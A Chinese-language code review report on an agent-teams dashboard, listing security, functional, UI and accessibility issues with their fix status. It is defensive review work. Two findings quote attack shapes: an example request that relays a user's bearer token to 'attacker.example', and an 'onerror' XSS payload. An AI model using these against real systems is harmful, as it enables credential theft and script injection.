# Code Review Issues

审查日期：2026-09-19
审查范围：全项目（安全性、功能正确性、性能、样式与主题、可访问性、组件一致性、文档）
基线状态：`npm run typecheck` 通过；`npm test` 1698 个用例全部通过；`npm run lint` 2 个 warning；`npm run build` 成功。

> 说明：文中「位置」均为 2026-09-19 审查时的代码路径。此后工作区信息架构与组件目录经过重构（如 `projects-section.tsx` 拆入 `sections/projects/*`、`topology/topology-canvas.tsx` 已不再被引用），引用路径可能已失效；问题本身的结论与修复状态以收档记录为准。

## 修复状态（2026-09-20 收档）

全部问题已按 `.monkeycode/specs/code-review-fixes/tasklist.md` 实施，收档时 lint 0 问题、tsc 干净、193 文件 / 1812 测试通过、`npm run build` 成功。

| 批次 | 问题 | 状态 |
|---|---|---|
| 任务 1~3 | SEC-01 ~ SEC-10 | 已修复（`b779e07`） |
| 任务 1~5 | FUNC-01 ~ FUNC-06 | 已修复（`b779e07`） |
| 任务 7 | FUNC-07 ~ FUNC-09 | 已修复（`daceb58`） |
| 任务 7 | FUNC-10（知识库 QwenPaw 口径） | 已修复（`daceb58`，用户确认口径） |
| 任务 8 | UI-01 ~ UI-05 | 已修复（`d630e0c`） |
| 任务 10 | UI-06、UI-07、ARCH-01、ARCH-02 | 已修复（`b779e07`） |
| 任务 9 | A11Y-01 ~ A11Y-04 | 已修复（`9835fe9`，axe 扫描额外修复 workers 视图切换悬挂 aria-controls 等 3 处真问题） |

有意保留的取舍（2 处）：
- ARCH-01 部分：artifacts/projects/knowledge 的局部错误横幅保留。`ApiErrorState` 是「未连接 Controller」整页语义，与这些区块的降级/局部错误语义不符；section 级裸文本加载态已统一为 Skeleton。
- SEC-05 部分：`auth/login`（Dashboard 主登录）保持 `allowPrivateNetwork` 现状。该路由无凭据转发，嵌入式部署依赖内网 controller，强制允许列表会破坏内网形态。

严重性定义：
- 高：安全漏洞或用户可感知的功能错误，建议尽快修复
- 中：特定场景下出错、体验或一致性问题
- 低：代码质量、可维护性、润色类问题

---

## 一、安全（后端 API）

### SEC-01（高）Nacos 凭据明文下发给任意低权限会话
- 位置：`src/app/api/agentteams/skills/nacos/config/route.ts:10-18`、`src/lib/skill-center-config.ts:10-45`
- 描述：GET 处理器无任何 RBAC 检查，直接返回存储在 MinIO 中的完整 Nacos 配置，包含 `username` 和 `password` 字段。同路由的 PUT 却要求 level 3（`enforceLevelOnlyRbac(..., 'update', ...)`）。任何 level 1 观察者会话都能读取技能中心注册中心凭据。
- 证据：
  ```ts
  export async function GET() {
    const config = await getNacosConfig();
    return NextResponse.json({ config }); // 含 password 字段
  ```
- 建议：GET 增加 RBAC（至少 level 2/3），并对 `password` 字段做掩码或省略，仅在 PUT 时接受明文。

### SEC-02（高）MinIO 存储读接口全部缺失 RBAC
- 位置：
  - `src/app/api/agentteams/storage/download/route.ts:5-34`
  - `src/app/api/agentteams/storage/presign/route.ts:7-27`（GET）
  - `src/app/api/agentteams/storage/buckets/route.ts:5-23`（GET）
  - `src/app/api/agentteams/storage/buckets/[bucket]/objects/route.ts:5-38`
- 描述：写操作（upload、DELETE）一致地调用了 `enforceLevelOnlyRbac`，但所有读接口均未调用。`createMinioClient()` 使用部署级管理员凭据（`AGENTTEAMS_FS_ACCESS_KEY/SECRET_KEY`），导致任意 level 1 会话可以：列出全部 bucket、枚举全部对象、下载任意对象（含 worker 工作区文件、agent 会话导出）、签发 15 分钟预签名 GET URL。worker 文件路由刻意对 `credentials.yaml` 等敏感文件返回 404，该路由族完全绕过了这层防护。
- 证据（download 路由无任何鉴权调用）：
  ```ts
  export async function GET(request: NextRequest) {
    const bucket = request.nextUrl.searchParams.get('bucket') || '';
    const client = createMinioClient();
    const stat = await client.statObject(bucketName, objectName);
  ```
- 建议：为四个读接口补齐 `enforceLevelOnlyRbac(request, 'view', ...)`，并复用 worker 路由的敏感文件名过滤。

### SEC-03（高）Team 文件读接口缺失 worker 路由已强化的 RBAC 与敏感文件过滤
- 位置：
  - `src/app/api/agentteams/teams/[name]/files/route.ts:37-68`（GET）
  - `src/app/api/agentteams/teams/[name]/files/download/route.ts:21-59`（GET）
- 描述：worker 对应路由在内部评审后已强化：`enforceServerSideRbac(request, 'view', 'worker', name)`（`workers/[name]/files/route.ts:71`）加 `isSensitiveFileName` 过滤。team 读路由只做了名称形状校验和前缀检查，两者均缺失，任何会话可列出并下载所有 team 共享工作区（含任务与项目数据）。
- 建议：对齐 worker 路由的实现（RBAC + 敏感文件过滤）。

### SEC-04（高）聊天 Markdown 渲染链路使用 rehypeRaw 且无 sanitize，存在 XSS 向量
- 位置：`src/components/dashboard/sections/chat/markdown-message.tsx:349`
- 描述：Matrix `formatted_body` HTML 路径已正确走 DOMPurify 清洗；但纯文本消息回退路径将用户可控内容交给 ReactMarkdown，rehype 插件链为 `[rehypeRaw, rehypeHighlight, rehypeKatex]`，整个依赖树中无 `rehype-sanitize`。`rehypeRaw` 会把消息中内嵌的原始 HTML 转成真实 DOM，房间内任意来电消息中的 `<img src=x onerror=...>` 即成为可执行标记。rehype-raw 官方文档明确要求与 rehype-sanitize 配对使用。
- 建议：在 rehype 插件链中加入 `rehype-sanitize`（按需放行允许的标签/schema），或移除 `rehypeRaw`。

### SEC-05（中）/api/matrix/* 默认可将用户 access token 转发至任意公网主机
- 位置：`src/app/api/matrix/proxy-helper.ts:10-24`、`src/lib/homeserver-allowlist.ts:68-75,123-131`
- 描述：`getMatrixHomeserver()` 调用 `validateHomeserverUrl(url)` 时不带选项。验证器自身文档写明 `requireAllowlist: true` 专为"转发用户 access token 的路由"设计，目前仅 debug-log 导出器使用了它。`MATRIX_HOMESERVER_ALLOWLIST` 未设置（代码默认）时任意公网主机放行，`POST /api/matrix/sync?homeserver=https://attacker.example` 会使 Dashboard 把受害者的 `Authorization: Bearer` token 中继到该主机；`/api/matrix/login` 同样会把原始用户名密码 POST 到调用方提供的 homeserver。`.env.example` 设置了 allowlist，但代码默认是宽松的。
- 建议：token 转发类路由默认 `requireAllowlist: true`，将"未配置 allowlist 时拒绝"作为兜底策略。

### SEC-06（中）公开的 setup/status 代理携带服务端 SA token 访问内部任意 host:port
- 位置：`src/middleware.ts:11-18,60-64`、`src/app/api/agentteams/setup/status/route.ts:5-10`、`src/app/api/agentteams/proxy-helper.ts:74-95,209-219`
- 描述：`setup/status` 位于 PUBLIC_PATHS，完全无鉴权。它接受登录前的 `?controllerUrl=` 覆盖，仅限内部主机（localhost、`.svc`、`.cluster.local` 等）但端口任意，且 `proxyToAgentTeams` 会在未认证请求上附加 `Authorization: Bearer <SA token>`。未认证攻击者可让 Dashboard 携带管理员 bearer token 请求任意内部 host:port 并读回响应——内部 SSRF/端口探测原语，并向内部服务泄露凭据。
- 建议：为 `setup/status` 增加 token gate（与 `setup/backends` 一致），或在未认证时剥离 SA token。

### SEC-07（中）容器日志接口无 RBAC 且接受任意容器名
- 位置：`src/app/api/agentteams/logs/[component]/route.ts:8-22,68-98`
- 描述：任意已认证会话（含 level 1）可读取宿主机上任意容器的 Docker 日志。`resolveContainerName` 对未知组件名直接透传给 Controller 的 Docker 代理，无 `enforceLevelOnlyRbac`，也未像 debug-log 导出器那样限定 `agentteams-*` 容器前缀。名称已做 URL 编码，无路径穿越，但属于面向观察者的主机级信息泄露。
- 建议：增加 RBAC，并将容器名解析收敛到已知组件白名单。

### SEC-08（中）插件上传/删除走 Higress Console 会话而非 Dashboard 会话；GET 完全无鉴权
- 位置：`src/app/api/dashboard/plugins/route.ts:50-60`、`src/app/api/dashboard/plugins/[id]/route.ts:14-18`
- 描述：这两个路由在 middleware matcher 之外，鉴权使用 `validateHigressSession()`（Console `_hi_sess` cookie）。后果：(a) 持有有效 Console 会话者可上传插件包，插件最终成为服务给所有 Dashboard 用户的可执行前端代码，当 Console 与 Dashboard 管理员人群不一致时构成提权路径；(b) 经 Matrix 登录的 Dashboard 管理员反而被 401 拒绝。GET 列表接口则完全无鉴权。插件包本身的安装防护（zip-slip、大小上限）是完善的，问题仅在鉴权模型错位。
- 建议：统一为 Dashboard 会话 + level 3 RBAC；GET 列表至少要求已登录。

### SEC-09（低）登录接口将内部异常原文返回给客户端
- 位置：`src/app/api/auth/login/route.ts:195-199`
- 描述：外层 catch 把 `err.message` 原样以 502 返回，可能泄露 "DASHBOARD_SESSION_SECRET not configured"、原始 fetch 失败信息等内部细节。
- 建议：对外返回通用错误文案，详细原因仅记录服务端日志。

### SEC-10（低）审计日志 sourceIp 可被伪造
- 位置：`src/lib/server-auth.ts:19,34-35`
- 描述：`readServerIdentity` 直接取 `x-forwarded-for` 作为审计来源 IP。Dashboard 直连暴露（无可信反代）时，攻击者可伪造审计记录中的 IP。身份本身由 middleware 注入、安全。
- 建议：仅在配置了可信代理时采信 `x-forwarded-for`，否则取 socket 地址。

---

## 二、功能正确性（前端逻辑）

### FUNC-01（高）Matrix 同步循环可永久停摆：busyRef 挡住首轮 poll 后不再重新调度
- 位置：`src/hooks/use-global-matrix-sync.ts:51,256,322-334`
- 描述：`poll()` 入口 `if (cancelled || isStale() || busyRef.current) return;` 直接返回，重新调度 `setTimeout(poll, retryDelay)` 只发生在函数末尾。当 effect 因组件重挂载而重建时（开发态 StrictMode 双挂载、错误边界重挂、未来重构），cleanup 刻意保留 `busyRef = true` 等旧请求排空；旧请求是 25 秒长轮询，新 effect 的首轮 poll 在 500ms 后触发时必然撞上 `busyRef.current === true` 而提前 return，同步链此后再无人重启——未读数、侧栏元数据、任务面板全部停止更新，直到下次手动刷新。
- 证据：
  ```ts
  const poll = async () => {
    if (cancelled || isStale() || busyRef.current) return; // 提前返回，不重新调度
    ...
    if (!cancelled && !isStale()) {
      timeoutId = setTimeout(poll, retryDelay); // 仅成功/失败路径会走到这里
    }
  };
  ```
- 建议：`busyRef` 分代化（epoch 计数）或提前返回时同样安排重试；cleanup 时重置 busyRef 并让在途请求的结果按代失效。

### FUNC-02（中）房间改名补丁被 setRoomMeta 吞掉
- 位置：`src/hooks/use-matrix.ts:150-158`、`src/hooks/use-global-matrix-sync.ts:241-252`
- 描述：`setRoomMeta` 以 `lastMessageTs / lastMessagePreview / unreadCount / unreadHighlightCount` 四字段判断是否值得更新，全部相同则 `return state`。同步循环的 `ingestRoomMeta` 对仅有 `m.room.name` 事件的批次只产出 `{ roomName }` 补丁，四字段不变 → 补丁被丢弃，房间改名不生效。
- 建议：比较逻辑纳入 `roomName`（或对补丁键做全量浅比较）。

### FUNC-03（中）自动重连定时器存在挂载竞态：初始断开状态永远不会启动定时器
- 位置：`src/lib/agentteams-store.ts:210-254`
- 描述：`startAutoReconnect` 仅由 store 订阅的"状态迁移"触发（`shouldReconnect && !wasReconnecting`）。store 初始即为 `autoReconnect=true, isConnected=false` 时，挂载后没有任何 state 变化能构成该迁移（`checkConnection` 失败不改变这些字段），定时器永不启动；只有用户手动开关设置或修改 interval 才能间接触发。用户看到的症状是断线后不会自动重连。
- 建议：模块加载/首次订阅时对初始状态调用一次 `startAutoReconnect()`，或把触发条件改为"进入断开态"而非"迁移沿"。

### FUNC-04（中）聊天深链接在加载完成前被消费丢失
- 位置：`src/components/dashboard/sections/chat/ChatSection.tsx:78-85`、`src/lib/hitl-inbox.ts:94-100`
- 描述：渲染期间无条件调用 `takePendingChatRoomId()`（取值即清空），而应用该值的条件要求 `!isLoading && rooms.some(...)`。若深链接到达时房间列表尚未加载完成，pending 值被取走后因条件不满足被直接丢弃，跳转失效。注释也承认此写法是为绕过 `react-hooks/set-state-in-effect` lint 规则。
- 建议：仅在条件全部满足时消费 pending 值；或改用 useEffect + ref 的标准消费模式。

### FUNC-05（中）问天 SSE 流无取消通道，组件卸载后仍在读流
- 位置：`src/plugins/wen-tian/index.tsx:302-348,843-901,703,1218`
- 描述：`collectSSE` 的 fetch 不接受 `AbortSignal`，`handleDiagnose` 消费异步生成器时无中断路径；`useEffect`/`useCallback` 依赖数组中的 `[api]` 是 eslint 报出的无效依赖（本项目仅有的 2 个 lint warning）。对比同文件健康检查的普通 fetch 使用了 `cancelled` 标志，说明作者掌握该模式但未用于 SSE。用户离开页面或重新发起诊断时，旧流继续占用连接并可能向已卸载组件回写状态。
- 建议：`collectSSE` 增加 `signal` 参数，`handleDiagnose` 传入 AbortController，在卸载/重试时 abort；修复两处依赖数组。

### FUNC-06（中）仪表盘外壳未用 selector 订阅 store，每次 sync 批次触发全壳重渲染
- 位置：`src/components/dashboard/agent-teams-dashboard.tsx:88-90`
- 描述：`useAgentTeamsStore()` 与 `useMatrixStore()` 均无 selector。Matrix store 在每个 sync 批次都会变更 `isSyncing`、`lastSyncedAt`，agentteams store 亦含高频字段（`connectionLatency` 等），导致顶层外壳随每次轮询重渲染，其下所有 section 一并参与调和。
- 建议：两处订阅改为逐字段 selector（同文件 91 行 `useNotificationStore((s) => s.notifications)` 已是正确示范）。

### FUNC-07（低）HITL 审批关键词硬编码中文，其他语言用户无法完成审批
- 位置：`src/lib/hitl-inbox.ts:117-120`
- 描述：`isHitlResolutionReply` 仅识别 `'/approve'` 与 `'拒绝'`。英文 locale 用户回复 `'deny'`、`'reject'` 时确认项永远留在收件箱。
- 建议：扩展为多语言关键词集合，或改用交互按钮而非文本匹配。

### FUNC-08（低）Nacos SSE 重连固定 5 秒无退避，且清理存在窄竞态
- 位置：`src/hooks/use-nacos-events.ts:18-41`
- 描述：`onerror` 固定 5 秒重连，服务端持续不可用时形成固定频率风暴；cleanup 时若 `reconnectTimer` 已触发且新 `es` 尚未赋值，新连接将脱离清理范围造成泄漏。
- 建议：加指数退避上限；将 `es` 引用放入 ref 并在 cleanup 中对最新实例 close。

### FUNC-09（低）useSessionTick 每实例一个 interval
- 位置：`src/hooks/use-worker-session-state.ts:39-46`
- 描述：每个使用会话状态点的组件各持有独立的 60 秒 `setInterval` 与 state，列表页 N 行即 N 个定时器和 N 次独立重渲染。
- 建议：提升为模块级共享 tick（单 interval + 订阅计数）或使用 context 提供。

### FUNC-10（中）知识库面板未按 runtime 过滤，非 qwenpaw Worker 选中后必然空转
- 位置：`src/components/dashboard/sections/knowledge-section.tsx:278-280`、`423`（worker 下拉与 effectiveWorker 兜底）
- 描述：KB 数据面 `/api/agentteams/workers/[name]/workspace-files/*` 是 QwenPaw 专属能力（文件头部注释即注明布局按「QwenPaw workspace_files.py 实锤形状」定案：MEMORY.md / memory/** / digest/**）。但 worker 下拉直接渲染 `useWorkers()` 全量列表，`effectiveWorker` 兜底取 `workers[0]`，两者均不过滤 `runtime`。选中 openclaw/copaw/hermes/openhuman/deepseek-harness 的 Worker 时，tree 端点 404 或返回非约定形状，表现为降级横幅/空树，用户无从得知原因。
- 建议：下拉仅列 `runtime === 'qwenpaw'` 的 Worker；无 qwenpaw Worker 时显示说明性空态（「知识库当前仅支持 QwenPaw 运行时的 Worker」），并附 runtime badge 防后续 runtime 接入时静默失配。`WorkerResponse.runtime` 字段已存在（agentteams-api.ts:31），改动纯前端。
- 备注（2026-09-20 用户确认）：知识库目前只支持 Qwenpaw，按此口径做过滤与文案说明。

---

## 三、样式 / 主题 / 视觉

### UI-01（高）项目/任务状态徽章用 300 级文字色，浅色主题下近乎不可见，且配色 map 双份手工镜像
- 位置：`src/components/dashboard/sections/projects-section.tsx:53-59`、`src/components/dashboard/sections/tasks-section.tsx:134-140`
- 描述：`PROJECT_STATUS_COLOR` 使用 `text-slate-300`、`text-violet-300` 等暗底配色，无 `dark:` 分支。在默认浅色主题下渲染于 `bg-slate-500/15`（近白底）上，对比度约 1.4:1，状态文字不可读。同文件 `OUTCOME_COLOR`（tasks-section.tsx:143）用了正确的 `text-emerald-700 dark:text-emerald-400` 写法，形成同仓库内自相矛盾。两个文件各持一份相同 map，注释明示手工同步，已具漂移风险。
- 建议：统一改为带 `dark:` 分支的双模式配色，并抽取为共享常量模块。

### UI-02（中）拓扑画布完全绕过主题系统：硬编码 hex 色板、低对比连线、hover-only 指针
- 位置：`src/components/dashboard/topology/topology-canvas.tsx:21-35,157,175-188`；同类问题：`overview-section.tsx:603-604`、`src/lib/phase-colors.ts:6-14`、`src/lib/agent-health.ts:91-96`、`worker-session-dot.tsx:14-16`
- 描述：节点/边使用固定 hex（默认边 `#64748b` 叠加 `opacity: 0.4`，深色卡片上不足 2:1）；节点设置 `cursor: 'pointer'` 与 hover 处理器但无 onClick、无 tabIndex、svg 无 role/aria-label——指针可供性是假的，读屏用户一无所获；浅色主题下 hover 白描边不可见。上述散点使"高对比度主题"的承诺在可视化区域内失效（idle 圆点 `#c0c4cc` 在白底约 1.6:1）。
- 建议：可视化配色接入 CSS 变量/主题 token；补齐交互语义（可点击才设 pointer，配 keyboard 支持）。

### UI-03（中）`rgba(var(--primary), 0.1)` 是无效 CSS，快速开始步骤背景被静默丢弃；完成开关状态未暴露
- 位置：`src/components/dashboard/sections/quickstart-section.tsx:338-345`
- 描述：`--primary` 是完整颜色值（`oklch(...)` 或 hex），拼进 `rgba()` 非法，声明被浏览器丢弃，步骤序号按钮在所有主题下都无背景色。同一按钮作为完成 toggle 仅靠 `title` 表达状态，无 `aria-pressed`。
- 建议：改用 `bg-primary/10` 等 Tailwind 透明度语法；补 `aria-pressed`。

### UI-04（中）Mermaid 图固定浅色 default 主题，深色/高对比下不可读
- 位置：`src/components/dashboard/sections/chat/mermaid-renderer.tsx:27-33`
- 描述：`mermaid.initialize({ theme: 'default', ... })` 与解析到的主题无关，深色文字渲染在跟随 `bg-muted/30` 的深色卡片上。另：76 行以 `dangerouslySetInnerHTML` 注入 SVG，安全性依赖 mermaid 默认 `securityLevel: 'strict'` 的隐式行为，而 `htmlLabels: true` 被显式开启——安全相关配置应显式声明。
- 建议：按当前主题动态选择 mermaid 主题（dark/high-contrast 对应 `theme: 'dark'` 或自定义变量），并显式设置 `securityLevel: 'strict'`。

### UI-05（中）浅色主题多处文字对比度低于 WCAG AA
- 位置：
  - `src/app/globals.css:95`：`--muted-foreground: oklch(0.556 0 0)` 约 #8c8c8c，白底约 3.4:1（AA 正文要求 4.5:1），却是全站 `text-xs/sm` 说明文字的主力色
  - `src/components/dashboard/sections/chat/markdown-message.tsx:313,394`（另 156,199,253）：`text-emerald-600` 链接白底约 3.9:1
  - `src/components/dashboard/sections/chat/mermaid-renderer.tsx:72`：`text-red-500` 约 3.8:1
  - `src/components/dashboard/settings/theme-tab.tsx:113-114`：内置 "emerald" 预设 `--primary: #10b981` 配 `--primary-foreground: #ffffff` 约 2.5:1，应用后所有主按钮不及格
- 建议：加深 muted-foreground（约 oklch 0.48 以下）、链接与错误色，emerald 预设前景改深色文字。

### UI-06（低）组件一致性问题：手写 table、原生 select、a 标签当按钮
- 位置：
  - `audit-section.tsx:153-154`、`security-section.tsx:97-98`：手写 `<table className="w-full text-sm">`，而 worker/team/manager/human 表格用 shadcn `Table`（如 `team-table.tsx:54`），行边框/hover/内边距表现不一
  - `ChatRoom.tsx:1011-1020`：原生 `<select>` 无样式焦点、无 aria-label，而其他 section 用 shadcn `Select`
  - `worker-files-panel.tsx:373-377`：`<a>` 手工样式成按钮，而非 `Button asChild`
- 建议：统一收敛到 `src/components/ui` 既有原语。

### UI-07（低）系统性小字号：8-10px 承载关键信息，且不随主题 fontSize token 缩放
- 位置：`ChatRoom.tsx:960,966`、`health-ring.tsx:69,55`、`room-list-item.tsx`、`chat-auth-badge.tsx:41` 等
- 描述：`src/components/dashboard` 下 `text-[10px]`~`text-[12px]` 共约 287 处，离群值 `text-[9px]`（成员列表 worker ID）、`text-[8px]`（头像缩写）。状态关键信息（worker ID、健康分、徽章文字）低于合理可读下限；主题系统的 `fontSize` token 只缩放根字号，任意值像素类不跟随。
- 建议：最低可读字号收敛到 11-12px，或改用 `text-xs` 等 token 类参与主题缩放。

---

## 四、可访问性

### A11Y-01（中）多处图标按钮无可访问名称
- 位置：
  - `header.tsx:160-167`：移动端汉堡按钮（仅 `<Menu>` 图标）
  - `header.tsx:339-341`：设置齿轮（相邻 325 行主题按钮有 `aria-label="切换主题"`，反差明显）
  - `notification-popover.tsx:38-45`：铃铛按钮
  - `markdown-message.tsx:48-55`：代码复制按钮，且 `opacity-0 group-hover:opacity-100` 无 `group-focus-within`，键盘用户聚焦的是不可见控件
  - `settings/theme-tab.tsx:334-342`：`.map()` 内删除主题按钮，读屏播报为 N 个裸 "button"
  - `worker-files-panel.tsx:208-216`：刷新按钮（连 title 也没有）
  - `models-section.tsx:697`：原生 `<button>` 开关仅图标切换，无 `role="switch"`/`aria-checked`
- 共享组件 `CopyButton`（copy-button.tsx:24-25）已有正确范式，属应用不一致。
- 建议：逐一补 `aria-label`；复制按钮补 `group-focus-within:opacity-100`；开关语义化。

### A11Y-02（中）拖拽分隔条键盘不可用
- 位置：`ChatRoom.tsx:980-992`、`chat-room-sidebar.tsx:170-176`
- 描述：ChatRoom 分隔条具备完整 ARIA（`role="separator"`、`aria-valuemin/max/now`、`tabIndex={0}`）却只有 `onPointerDown`，可聚焦但键盘无法操作；room-sidebar 分隔条连 `tabIndex` 都没有，键盘完全不可达。两个面板均为纯鼠标缩放。
- 建议：补 `onKeyDown`（方向键步进），sidebar 分隔条补 `tabIndex={0}`。

### A11Y-03（中）Chat 布局零响应式断点，移动端消息区可被挤压殆尽
- 位置：`ChatSection.tsx:167-216`、`ChatRoom.tsx:936-996`、`chat-room-sidebar.tsx:7-9`
- 描述：ChatSection/ChatRoom/侧栏中 `hidden md:`/`lg:` 命中数为零。房间列表侧栏用户可调 176-448px 并持久化，右面板 `w-48`、成员侧栏 `w-52`、worker 文件面板 256-600px 可同时展开且在 `md` 以下无自动折叠；375px 视口下消息区几乎归零。
- 建议：小屏默认折叠非消息面板，提供抽屉/浮层形态。

### A11Y-04（中）Artifacts 区固定 280px 树面板 + 内联视口数学，无移动端处理
- 位置：`src/components/dashboard/sections/artifacts-section.tsx:496-498`
- 描述：左树硬编码 `w-[280px] shrink-0`，`maxHeight: 'calc(100vh - 320px)'` 内联计算。手机上详情面板仅剩约 60px 宽，无重排/折叠逻辑。
- 建议：小屏改为上下布局或抽屉。

---

## 五、架构 / 一致性

### ARCH-01（中）加载/空/错误态三种实现并存
- 位置：共享原语 `section-skeleton.tsx`（SectionSkeleton）与 `api-error-state.tsx`（ApiErrorState）仅被 5 个 section 使用（workers/teams/managers/humans/ChatSection）；其余各自为政：
  - `audit-section.tsx:144`：裸文本 `加载中...`
  - `overview-section.tsx:284`：`加载项目数据...`
  - tasks/artifacts/projects/knowledge 各自实现降级/错误横幅（如 `artifacts-section.tsx:183-195`）
- 描述：用户在不同 tab 看到完全不同的加载与错误表现，逻辑重复。
- 建议：所有 section 统一接入 SectionSkeleton / ApiErrorState。

### ARCH-02（低）README 版本号与 package.json 不一致
- 位置：`README.md:80`（`v1.2.3.1`）vs `package.json:3`（`0.2.0`）
- 描述：两处版本号相差甚远，至少有一处失真，影响发布与运维判断。
- 建议：确立单一版本源，另一处引用或移除。

---

## 修复优先级建议

1. 立即处理四个"高"：SEC-01/02/03（补齐 RBAC 与敏感文件过滤，均为机械性对齐兄弟路由的既有模式）、SEC-04（接入 rehype-sanitize）、FUNC-01（同步循环停摆）、UI-01（浅色主题状态徽章不可读）。
2. 第二批处理"中"级安全项 SEC-05/06/07/08，与"中"级功能项 FUNC-02~06。
3. 其余"中/低"按模块批次清理：A11Y 与 UI 项可在一次样式专项中合并处理。

## 已确认的亮点（无需处理）

- middleware 对每个受控请求覆写/删除 `x-agentteams-user*` 头，身份伪造已防护
- 会话 cookie `SameSite=Lax`，未发现状态变更型 GET，CSRF 面较小
- debug-log 导出器：RBAC、体积/时间预算、防 marker 伪造、Matrix token 走 requireAllowlist、PII 默认脱敏
- 技能/插件包安装：zip-slip 防护、大小上限完善
- setup token 流：恒时比较、fail-closed、0600 权限落盘
- 聊天主时间线使用 react-virtuoso 虚拟化，mutation 后的 query 失效覆盖完整
- localStorage 访问普遍带 try-catch，定时器清理规范
